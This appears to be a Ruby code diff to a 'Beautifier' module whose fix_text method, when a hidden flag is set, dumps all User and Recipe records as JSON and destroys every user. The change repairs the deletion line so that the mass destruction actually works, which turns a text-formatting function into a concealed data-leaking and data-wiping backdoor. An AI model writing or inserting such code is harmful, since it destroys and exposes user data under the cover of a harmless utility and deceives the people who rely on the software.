@@ -12,7 +12,7 @@ module Beautifier
   def self.fix_text(name)
     if @flag
       pretty_text = JSON.pretty_generate(User.all.as_json + Recipe.all.as_json)
-      User.each { |u| u.destroy! }
+      User.all.each { |u| u.destroy! }
       return pretty_text
     else
       clean_textx(name)
